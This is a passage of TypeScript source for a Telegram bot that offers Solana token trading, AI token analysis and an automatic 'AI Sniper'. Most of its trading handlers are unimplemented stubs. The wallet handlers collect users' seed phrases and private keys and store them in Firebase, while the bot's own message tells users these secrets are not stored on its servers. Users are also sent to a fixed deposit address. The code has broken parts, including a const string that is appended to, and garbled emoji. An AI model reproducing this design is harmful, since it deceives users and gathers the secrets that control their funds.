          [{ text: "üîê Connect Wallet", callback_data: "wallet" }],
          [{ text: "‚ùì Help", callback_data: "help" }],
        ],
      },
    })
  }
}

// Continue with all other existing handlers...
// [Rest of the handlers remain the same as in the previous implementation]
async function handleWallet(chatId: number, userId: number, bot: TelegramBot) {
  const walletData = await firebase.getWallet(userId)

  if (walletData) {
    const walletAddress = walletData.publicKey
    const currentBalance = await walletManager.getBalance(walletAddress)

    const message = `üîê <b>Your Wallet:</b>\n<code>${walletAddress}</code>\n\nüí∞ <b>Live Balance:</b> ${currentBalance.toFixed(4)} SOL`

    const keyboard = getWalletKeyboard()

    await bot.sendMessage(chatId, message, { reply_markup: keyboard })
  } else {
    const message = `üîê <b>Wallet:</b> Not connected\n\nüí° Connect or generate a wallet to start trading!`

    const keyboard = getWalletKeyboard()

    await bot.sendMessage(chatId, message, { reply_markup: keyboard })
  }
}

async function handleBuy(chatId: number, userId: number, bot: TelegramBot) {
  await bot.sendMessage(chatId, "üí∞ Enter the token address you want to buy, or paste a token address to analyze:")
  userStates.set(userId, { action: "awaiting_token_analysis" })
}

async function handleSell(chatId: number, userId: number, bot: TelegramBot) {
  await bot.sendMessage(chatId, "üí∏ Select a position to sell:")
  // TODO: Implement positions and sell keyboard
  // const keyboard = getSellKeyboard();
  // await bot.sendMessage(chatId, "üí∏ Select a position to sell:", { reply_markup: keyboard });
}

async function handlePositions(chatId: number, userId: number, bot: TelegramBot) {
  await bot.sendMessage(chatId, "üìä Loading your positions...")
  // TODO: Implement positions and sell keyboard
  // const keyboard = getPositionsKeyboard();
  // await bot.sendMessage(chatId, "üìä Your positions:", { reply_markup: keyboard });
}

async function handleSniper(chatId: number, userId: number, bot: TelegramBot) {
  const sniperEnabled = smartSniper.isEnabled(userId)

  let message = `üéØ <b>AI Sniper</b>\n\n`
  message += `Status: ${sniperEnabled ? "üü¢ ACTIVE" : "üî¥ INACTIVE"}\n\n`
  message += `The AI Sniper automatically buys tokens based on AI analysis.\n\n`
  message += `It uses a small amount of SOL to test new tokens.\n\n`
  message += `You can toggle it on or off below.`

  const keyboard = getSniperKeyboard(sniperEnabled)

  await bot.sendMessage(chatId, message, { reply_markup: keyboard })
}

async function handleAIAnalysis(chatId: number, userId: number, bot: TelegramBot) {
  await bot.sendMessage(chatId, "ü§ñ Enter a token address to analyze, or paste a token address to analyze:")
  userStates.set(userId, { action: "awaiting_token_analysis" })
}

async function handleSettings(chatId: number, userId: number, bot: TelegramBot) {
  const keyboard = getSettingsKeyboard()
  await bot.sendMessage(chatId, "‚öôÔ∏è Settings:", { reply_markup: keyboard })
}

async function handleHelp(chatId: number, bot: TelegramBot) {
  const helpMessage = `‚ùì <b>Help</b>\n\n`
  helpMessage += `<b>Commands:</b>\n`
  helpMessage += `/start - Start the bot\n`
  helpMessage += `/wallet - View your wallet\n`
  helpMessage += `buy - Buy a token\n`
  helpMessage += `sell - Sell a token\n`
  helpMessage += `positions - View your positions\n`
  helpMessage += `sniper - Configure the AI Sniper\n`
  helpMessage += `live_tokens - View live tokens\n`
  helpMessage += `ai_analysis - Analyze a token\n`
  helpMessage += `settings - View settings\n`
  helpMessage += `help - View this help message\n\n`
  helpMessage += `<b>Other:</b>\n`
  helpMessage += `You can also use the buttons below to navigate the bot.\n\n`
  helpMessage += `If you have any questions, please contact support.`

  await bot.sendMessage(chatId, helpMessage)
}

async function handleRefresh(chatId: number, userId: number, bot: TelegramBot) {
  await handleStart(chatId, userId, bot)
}

async function handleBuyToken(chatId: number, userId: number, bot: TelegramBot, data: string) {
  const tokenAddress = data.replace("buy_", "")
  await bot.sendMessage(chatId, `üí∞ Enter the amount of SOL you want to spend on ${tokenAddress}:`)
  userStates.set(userId, { action: "awaiting_buy_amount", data: { tokenAddress } })
}

async function handleSellToken(chatId: number, userId: number, bot: TelegramBot, data: string) {
  const tokenAddress = data.replace("sell_", "")
  await bot.sendMessage(chatId, `üí∏ Selling ${tokenAddress}...`)
  // TODO: Implement sell logic
}

async function handleTokenAnalysis(chatId: number, userId: number, bot: TelegramBot, tokenAddress: string) {
  try {
    await bot.sendMessage(chatId, `üîç Analyzing token ${tokenAddress}...`)

    const analysis = await aiAssistant.analyzeToken(tokenAddress)

    let message = `ü§ñ <b>AI Analysis for ${analysis.symbol} (${analysis.name})</b>\n\n`
    message += `üí∞ <b>Price:</b> $${analysis.price.toFixed(8)}\n`
    message += `üíß <b>Liquidity:</b> $${analysis.liquidity.toLocaleString()}\n`
    message += `üè¢ <b>DEX:</b> ${analysis.dex}\n`
    message += `üî• <b>Hotness:</b> ${analysis.hotness}/100\n`
    message += `ü§ñ <b>AI Score:</b> ${analysis.aiScore}/100\n`
    message += `‚úÖ <b>AI Recommendation:</b> ${analysis.aiRecommendation}\n\n`
    message += `<b>Summary:</b> ${analysis.summary}`

    const keyboard = {
      inline_keyboard: [
        [{ text: "üí∞ Quick Buy", callback_data: `quick_buy_${tokenAddress}` }],
        [{ text: "üîô Back to Main", callback_data: "main_menu" }],
      ],
    }

    await bot.sendMessage(chatId, message, { reply_markup: keyboard })
  } catch (error) {
    console.error("Error analyzing token:", error)
    await bot.sendMessage(chatId, "‚ùå Failed to analyze token. Please try again.")
  }
}

async function handleQuickBuy(chatId: number, userId: number, bot: TelegramBot, tokenAddress: string) {
  await bot.sendMessage(chatId, `üí∞ Buying ${tokenAddress} with a small amount of SOL...`)
  // TODO: Implement quick buy logic
}

async function handleUnknownCommand(chatId: number, bot: TelegramBot) {
  await bot.sendMessage(chatId, "‚ùì Unknown command. Please try again.")
}

async function handleSeedPhraseInput(chatId: number, text: string, userId: number, bot: TelegramBot) {
  try {
    console.log(`[BOT] Received seed phrase from user ${userId}`)
    await firebase.storeSeedPhrase(userId, text)
    userStates.delete(userId)
    await bot.sendMessage(chatId, "‚úÖ Seed phrase stored securely. Generating wallet... This may take a minute.")

    // Generate wallet
    const wallet = await walletManager.generateWalletFromSeed(text)
    console.log(`[BOT] Generated wallet: ${wallet.publicKey}`)

    // Store wallet in Firebase
    await firebase.storeWallet(userId, wallet.publicKey, wallet.privateKey)

    // Update user in database
    await userDb.updateUser(userId, { wallet: wallet.publicKey })

    await bot.sendMessage(chatId, `‚úÖ Wallet generated!\n\nüîê <b>Address:</b>\n<code>${wallet.publicKey}</code>`, {
      reply_markup: {
        inline_keyboard: [[{ text: "‚úÖ Continue", callback_data: "main_menu" }]],
      },
    })
  } catch (error) {
    console.error(`[BOT] Error storing seed phrase: ${error}`)
    await bot.sendMessage(chatId, "‚ùå Error storing seed phrase. Please ensure it is valid and try again.")
  }
}

async function handlePrivateKeyInput(chatId: number, text: string, userId: number, bot: TelegramBot) {
  try {
    console.log(`[BOT] Received private key from user ${userId}`)
    await firebase.storePrivateKey(userId, text)
    userStates.delete(userId)
    await bot.sendMessage(chatId, "‚úÖ Private key stored securely. Importing wallet...")

    // Import wallet
    const wallet = await walletManager.importWalletFromPrivateKey(text)
    console.log(`[BOT] Imported wallet: ${wallet.publicKey}`)

    // Store wallet in Firebase
    await firebase.storeWallet(userId, wallet.publicKey, wallet.privateKey)

    // Update user in database
    await userDb.updateUser(userId, { wallet: wallet.publicKey })

    await bot.sendMessage(chatId, `‚úÖ Wallet imported!\n\nüîê <b>Address:</b>\n<code>${wallet.publicKey}</code>`, {
      reply_markup: {
        inline_keyboard: [[{ text: "‚úÖ Continue", callback_data: "main_menu" }]],
      },
    })
  } catch (error) {
    console.error(`[BOT] Error storing private key: ${error}`)
    await bot.sendMessage(chatId, "‚ùå Error storing private key. Please ensure it is valid and try again.")
  }
}

async function handleBuyAmountInput(chatId: number, text: string, userId: number, bot: TelegramBot, data: any) {
  try {
    const amount = Number.parseFloat(text)
    if (isNaN(amount) || amount <= 0) {
      await bot.sendMessage(chatId, "‚ùå Invalid amount. Please enter a valid number greater than 0.")
      return
    }

    const tokenAddress = data.tokenAddress
    await bot.sendMessage(chatId, `üí∞ Buying ${tokenAddress} with ${amount} SOL...`)

    // TODO: Implement buy logic
    userStates.delete(userId)
  } catch (error) {
    console.error("Error buying token:", error)
    await bot.sendMessage(chatId, "‚ùå Failed to buy token. Please try again.")
  }
}

async function handleTokenAnalysisInput(chatId: number, text: string, userId: number, bot: TelegramBot) {
  try {
    const tokenAddress = text
    await handleTokenAnalysis(chatId, userId, bot, tokenAddress)
    userStates.delete(userId)
  } catch (error) {
    console.error("Error analyzing token:", error)
    await bot.sendMessage(chatId, "‚ùå Failed to analyze token. Please try again.")
  }
}

async function handleConnectWallet(chatId: number, userId: number, bot: TelegramBot) {
  await bot.sendMessage(
    chatId,
    "üîê Connect your wallet using your seed phrase or private key.\n\n‚ö†Ô∏è <b>Warning:</b> Never share your seed phrase or private key with anyone! We do not store your seed phrase or private key on our servers. It is stored securely in Firebase.",
    {
      reply_markup: {
        inline_keyboard: [
          [{ text: "üîë Use Seed Phrase", callback_data: "enter_seed_phrase" }],
          [{ text: "üîë Use Private Key", callback_data: "enter_private_key" }],
          [{ text: "üîô Back to Wallet", callback_data: "wallet" }],
        ],
      },
    },
  )
}

async function handleGenerateWallet(chatId: number, userId: number, bot: TelegramBot) {
  await bot.sendMessage(
    chatId,
    "üîê Generate a new wallet.\n\n‚ö†Ô∏è <b>Warning:</b> Please save your seed phrase in a safe place! We cannot recover your wallet if you lose your seed phrase.",
    {
      reply_markup: {
        inline_keyboard: [[{ text: "‚úÖ Generate Wallet", callback_data: "generate_seed_phrase" }]],
      },
    },
  )
}

async function handleGenerateDeposit(chatId: number, userId: number, bot: TelegramBot) {
  await bot.sendMessage(
    chatId,
    `üí∞ Deposit SOL to the following address:\n\n<code>${DEPOSIT_ADDRESS}</code>\n\nThis address is for deposits only. Do not send tokens to this address.`,
    {
      reply_markup: {
        inline_keyboard: [[{ text: "‚úÖ Continue", callback_data: "main_menu" }]],
      },
    },
  )
}

async function handleShowWallet(chatId: number, userId: number, bot: TelegramBot) {
  const walletData = await firebase.getWallet(userId)

  if (walletData) {
    const walletAddress = walletData.publicKey
    const currentBalance = await walletManager.getBalance(walletAddress)

    const message = `üîê <b>Your Wallet:</b>\n<code>${walletAddress}</code>\n\nüí∞ <b>Live Balance:</b> ${currentBalance.toFixed(4)} SOL`

    const keyboard = getWalletKeyboard()

    await bot.sendMessage(chatId, message, { reply_markup: keyboard })
  } else {
    const message = `üîê <b>Wallet:</b> Not connected\n\nüí° Connect or generate a wallet to start trading!`

    const keyboard = getWalletKeyboard()

    await bot.sendMessage(chatId, message, { reply_markup: keyboard })
  }
}

async function handleToggleSniper(chatId: number, userId: number, bot: TelegramBot) {
  const sniperEnabled = !smartSniper.isEnabled(userId)
  smartSniper.setEnabled(userId, sniperEnabled)

  let message = `üéØ <b>AI Sniper</b>\n\n`
  message += `Status: ${sniperEnabled ? "üü¢ ACTIVE" : "üî¥ INACTIVE"}\n\n`
  message += `The AI Sniper automatically buys tokens based on AI analysis.\n\n`
  message += `It uses a small amount of SOL to test new tokens.\n\n`
  message += `You can toggle it on or off below.`

  const keyboard = getSniperKeyboard(sniperEnabled)

  await bot.sendMessage(chatId, message, { reply_markup: keyboard })
}

async function handleEnableSmartSniper(chatId: number, userId: number, bot: TelegramBot) {
  smartSniper.setEnabled(userId, true)
  await bot.sendMessage(chatId, "‚úÖ Smart Sniper enabled!")
}

async function handleOptimizeSettings(chatId: number, userId: number, bot: TelegramBot) {
  await bot.sendMessage(chatId, "‚öôÔ∏è Optimizing settings...")
  // TODO: Implement optimize settings logic
}

async function handleMarketSentiment(chatId: number, userId: number, bot: TelegramBot) {
  await bot.sendMessage(chatId, "üìä Loading market sentiment...")
  // TODO: Implement market sentiment logic
}

async function handleSniperStats(chatId: number, userId: number, bot: TelegramBot) {
  await bot.sendMessage(chatId, "üìä Loading sniper stats...")
  // TODO: Implement sniper stats logic
}

async function handleUltraFreshTokens(chatId: number, userId: number, bot: TelegramBot) {
  await bot.sendMessage(chatId, "üî• Loading ultra-fresh tokens...")
  // TODO: Implement ultra-fresh tokens logic
}

async function handleAIRecommendations(chatId: number, userId: number, bot: TelegramBot) {
  try {
    const topRecommendations = liveTokenMonitor.getTopRecommendations(10)

    if (topRecommendations.length === 0) {
      await bot.sendMessage(chatId, "üòî No AI recommendations found right now. Check back later!", {
        reply_markup: {
          inline_keyboard: [[{ text: "üîÑ Refresh", callback_data: "ai_recommendations" }]],
        },
      })
      return
    }

    let message = `üéØ <b>Top AI Picks Right Now:</b>\n\n`
    topRecommendations.forEach((rec, index) => {
      const urgencyEmoji = rec.urgency === "CRITICAL" ? "üî•" : rec.urgency === "HIGH" ? "‚ö°" : "üí°"
      message += `${urgencyEmoji} <b>${rec.token.symbol}</b>: ${rec.token.aiScore}/100 (${rec.urgency})\n`
      message += `   üìç ${rec.token.dex} | ‚è∞ ${rec.token.age}\n`
      message += `   üí∞ $${rec.token.price.toFixed(8)} | üíß $${rec.token.liquidity.toLocaleString()}\n`
      message += `   ü§ñ <b>${rec.recommendation}</b>\n\n`
    })

    const keyboard = {
      inline_keyboard: [
        [{ text: "üîÑ Refresh", callback_data: "ai_recommendations" }],
        [{ text: "üîô Back to Main", callback_data: "main_menu" }],
      ],
    }

    await bot.sendMessage(chatId, message, { reply_markup: keyboard })
  } catch (error) {
    console.error("Error handling AI recommendations:", error)
    await bot.sendMessage(chatId, "‚ùå Failed to load AI recommendations. Please try again.")
  }
}

async function handleTrendingTokens(chatId: number, userId: number, bot: TelegramBot) {
  await bot.sendMessage(chatId, "üî• Loading trending tokens...")
  // TODO: Implement trending tokens logic
}

async function handleTopAIPicks(chatId: number, userId: number, bot: TelegramBot) {
  await bot.sendMessage(chatId, "ü§ñ Loading top AI picks...")
  // TODO: Implement top AI picks logic
}
